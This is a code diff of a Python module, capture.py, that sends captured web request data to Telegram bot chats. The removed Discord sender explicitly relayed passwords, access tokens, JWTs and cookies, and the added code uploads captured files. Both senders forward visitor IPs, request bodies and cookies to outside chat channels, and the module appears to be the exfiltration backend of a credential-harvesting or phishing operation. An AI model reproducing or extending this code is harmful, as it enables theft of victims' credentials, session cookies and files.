@@ -1,7 +1,7 @@
 # capture.py
 import json
-import threading
 import urllib.request
+import uuid
 
 
 def _h(s):
@@ -10,97 +10,25 @@ def _h(s):
     return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
-# ============================================================
-#  DISCORD WEBHOOK
-# ============================================================
-
-class DiscordCapture:
-    def __init__(self, webhook_urls):
-        if isinstance(webhook_urls, str):
-            webhook_urls = [webhook_urls]
-        self.urls = [u for u in webhook_urls if u]
-
-    def send(self, record: dict):
-        if not self.urls:
-            return
-        threading.Thread(target=self._send_sync, args=(record,), daemon=True).start()
-
-    def _send_sync(self, record):
-        payload = self._build_embed(record)
-        for url in self.urls:
-            try:
-                self._post(url, payload)
-            except Exception as e:
-                print(f"[capture:discord] {e}")
-
-    def _build_embed(self, r):
-        src = r.get("source") or "?"
-        color = {
-            "generated":        0x2ecc71,
-            "generated_failed": 0xe74c3c,
-            "request":          0x3498db,
-        }.get(src, 0x95a5a6)
-
-        fields = []
-        fields.append({"name": "🌐 IP",   "value": f"`{r.get('ip') or '-'}`", "inline": True})
-        fields.append({"name": "📍 Path", "value": f"`{r.get('method') or '-'} {r.get('path') or '-'}`", "inline": True})
-        fields.append({"name": "🕒 Time", "value": f"`{r.get('ts') or '-'}`", "inline": False})
-
-        if r.get("user_agent"):
-            fields.append({"name": "🧭 UA", "value": f"```{r.get('user_agent')[:200]}```", "inline": False})
-        if r.get("referer"):
-            fields.append({"name": "🔗 Referer", "value": f"```{r.get('referer')[:200]}```", "inline": False})
-
-        q = r.get("query")
-        if q and q not in ("{}", "null", "None"):
-            fields.append({"name": "🧾 Query", "value": f"```json\n{q[:900]}\n```", "inline": False})
-
-        b = r.get("body")
-        if b:
-            fields.append({"name": "📨 Body", "value": f"```\n{b[:900]}\n```", "inline": False})
-
-        c = r.get("cookies")
-        if c and c not in ("{}", "null", "None"):
-            fields.append({"name": "🍪 Cookies", "value": f"```{c[:900]}```", "inline": False})
-
-        if r.get("uid"):
-            fields.append({"name": "🆔 UID", "value": f"`{r.get('uid')}`", "inline": True})
-        if r.get("password"):
-            fields.append({"name": "🔑 Pass", "value": f"`{r.get('password')}`", "inline": True})
-        if r.get("open_id"):
-            fields.append({"name": "🧩 OpenID", "value": f"`{r.get('open_id')}`", "inline": True})
-        if r.get("real_uid"):
-            fields.append({"name": "👤 RealUID", "value": f"`{r.get('real_uid')}`", "inline": True})
-
-        if r.get("access_token"):
-            fields.append({"name": "🎟 AccessToken", "value": f"```\n{r.get('access_token')[:900]}\n```", "inline": False})
-        if r.get("jwt_token"):
-            fields.append({"name": "💎 JWT", "value": f"```\n{r.get('jwt_token')[:900]}\n```", "inline": False})
-        if r.get("error"):
-            fields.append({"name": "⚠️ Error", "value": f"```{r.get('error')[:900]}```", "inline": False})
-
-        embed = {
-            "title":     f"📥 {src}",
-            "color":     color,
-            "fields":    fields[:25],
-            "timestamp": r.get("ts"),
-            "footer":    {"text": "API Capture"},
-        }
-        return {"embeds": [embed]}
-
-    def _post(self, url, payload):
-        data = json.dumps(payload).encode()
-        req = urllib.request.Request(
-            url, data=data,
-            headers={"Content-Type": "application/json"},
-            method="POST",
+def _multipart(fields: dict, files: list):
+    boundary = "----capture" + uuid.uuid4().hex
+    out = []
+    for k, v in fields.items():
+        out.append(f"--{boundary}\r\n".encode())
+        out.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
+        out.append(str(v).encode("utf-8"))
+        out.append(b"\r\n")
+    for f in files:
+        out.append(f"--{boundary}\r\n".encode())
+        out.append(
+            f'Content-Disposition: form-data; name="{f["name"]}"; filename="{f["filename"]}"\r\n'.encode()
         )
-        urllib.request.urlopen(req, timeout=8).read()
+        out.append(f'Content-Type: {f.get("content_type", "application/octet-stream")}\r\n\r\n'.encode())
+        out.append(f["data"])
+        out.append(b"\r\n")
+    out.append(f"--{boundary}--\r\n".encode())
+    return b"".join(out), f"multipart/form-data; boundary={boundary}"
 
-
-# ============================================================
-#  TELEGRAM
-# ============================================================
 
 class TelegramCapture:
     API = "https://api.telegram.org/bot{token}/{method}"
@@ -114,46 +42,95 @@ class TelegramCapture:
     def send(self, record: dict):
         if not self.token or not self.chats:
             return
-        threading.Thread(target=self._send_sync, args=(record,), daemon=True).start()
+        self._send_sync(record)
 
     def _send_sync(self, record):
+        files = record.pop("_files", []) or []
         text = self._format(record)
         for chat_id in self.chats:
             try:
-                self._message(chat_id, text)
+                if text.strip():
+                    self._message(chat_id, text)
+                for f in files:
+                    self._document(chat_id, f)
             except Exception as e:
                 print(f"[capture:telegram:{chat_id}] {e}")
 
+    # ---------------- formatting ----------------
+
     def _format(self, r):
-        L = [f"📥 <b>{_h(r.get('source'))}</b>",
-             f"🕒 <code>{_h(r.get('ts'))}</code>", "",
-             f"🌐 <b>IP:</b> <code>{_h(r.get('ip'))}</code>",
-             f"📍 <b>{_h(r.get('method'))} {_h(r.get('path'))}</b>"]
+        src = r.get("source") or "?"
+        icon = {
+            "generated":        "✅",
+            "generated_failed": "❌",
+            "request":          "📥",
+        }.get(src, "📌")
+
+        L = []
+
+        # header
+        L.append(f"{icon} <b>{_h(src.upper())}</b>")
+
+        # identity line
+        ident = []
+        if r.get("sender"):
+            ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
+        if r.get("ip"):
+            ident.append(f"🌐 <code>{_h(r.get('ip'))}</code>")
+        if ident:
+            L.append(" • ".join(ident))
+
+        L.append(f"🕒 <code>{_h(r.get('ts'))}</code>")
+
+        # request line
+        L.append("")
+        L.append("━━━━━━━━━━━━━━━━━━━━")
+        L.append(f"<b>{_h(r.get('method'))}</b>  <code>{_h(r.get('path'))}</code>")
+        L.append("━━━━━━━━━━━━━━━━━━━━")
+
+        # user agent / referer
         if r.get("user_agent"):
-            L.append(f"🧭 <b>UA:</b> {_h(r.get('user_agent'))[:180]}")
+            L.append(f"🧭 <i>{_h(r.get('user_agent'))[:180]}</i>")
         if r.get("referer"):
-            L.append(f"🔗 <b>Ref:</b> {_h(r.get('referer'))[:150]}")
+            L.append(f"🔗 <i>{_h(r.get('referer'))[:150]}</i>")
+
+        # query
         q = r.get("query")
         if q and q not in ("{}", "null", "None"):
-            L.append(f"🧾 <b>Query:</b> <code>{_h(q)}</code>")
+            L.append("")
+            L.append("🔎 <b>Query</b>")
+            L.append(f"<pre>{_h(q)[:600]}</pre>")
+
+        # body
         b = r.get("body")
         if b:
-            L.append(f"📨 <b>Body:</b>\n<code>{_h(b)[:500]}</code>")
+            L.append("")
+            L.append("📨 <b>Body</b>")
+            L.append(f"<pre>{_h(b)[:600]}</pre>")
+
+        # cookies
         c = r.get("cookies")
         if c and c not in ("{}", "null", "None"):
-            L.append(f"🍪 <b>Cookies:</b> <code>{_h(c)[:300]}</code>")
-        L.append("")
-        for k, icon, lab in [("uid","🆔","UID"),("password","🔑","Pass"),
-                             ("open_id","🧩","OpenID"),("real_uid","👤","RealUID")]:
-            if r.get(k):
-                L.append(f"{icon} <b>{lab}:</b> <code>{_h(r.get(k))}</code>")
-        if r.get("access_token"):
-            L.append(f"🎟 <b>AccessToken:</b>\n<code>{_h(r.get('access_token'))}</code>")
-        if r.get("jwt_token"):
-            L.append(f"💎 <b>JWT:</b>\n<code>{_h(r.get('jwt_token'))}</code>")
+            L.append("")
+            L.append("🍪 <b>Cookies</b>")
+            L.append(f"<pre>{_h(c)[:400]}</pre>")
+
+        # files
+        fsum = r.get("files_summary")
+        if fsum:
+            L.append("")
+            L.append("📎 <b>Files</b>")
+            L.append(f"<pre>{_h(fsum)[:800]}</pre>")
+
+        # error
         if r.get("error"):
-            L.append(f"⚠️ <b>Error:</b> {_h(r.get('error'))}")
+            L.append("")
+            L.append("⚠️ <b>Error</b>")
+            L.append(f"<pre>{_h(r.get('error'))[:500]}</pre>")
+
         return "\n".join(L)
+
+    # ---------------- telegram api ----------------
 
     def _api(self, m):
         return self.API.format(token=self.token, method=m)
@@ -166,7 +143,6 @@ class TelegramCapture:
             else:
                 buf = (buf + "\n" + line) if buf else line
         if buf: chunks.append(buf)
-
         for chunk in chunks:
             data = json.dumps({
                 "chat_id": chat_id, "text": chunk,
@@ -174,4 +150,21 @@ class TelegramCapture:
             }).encode()
             req = urllib.request.Request(self._api("sendMessage"), data=data,
                 headers={"Content-Type": "application/json"}, method="POST")
-            urllib.request.urlopen(req, timeout=8).read()
+            urllib.request.urlopen(req, timeout=10).read()
+
+    def _document(self, chat_id, f):
+        body, ctype = _multipart(
+            fields={
+                "chat_id": chat_id,
+                "caption": f'📎 {f["filename"]} — {len(f["data"])} bytes',
+            },
+            files=[{
+                "name": "document",
+                "filename": f["filename"],
+                "data": f["data"],
+                "content_type": f.get("content_type", "application/octet-stream"),
+            }],
+        )
+        req = urllib.request.Request(self._api("sendDocument"), data=body,
+            headers={"Content-Type": ctype}, method="POST")
+        urllib.request.urlopen(req, timeout=60).read()
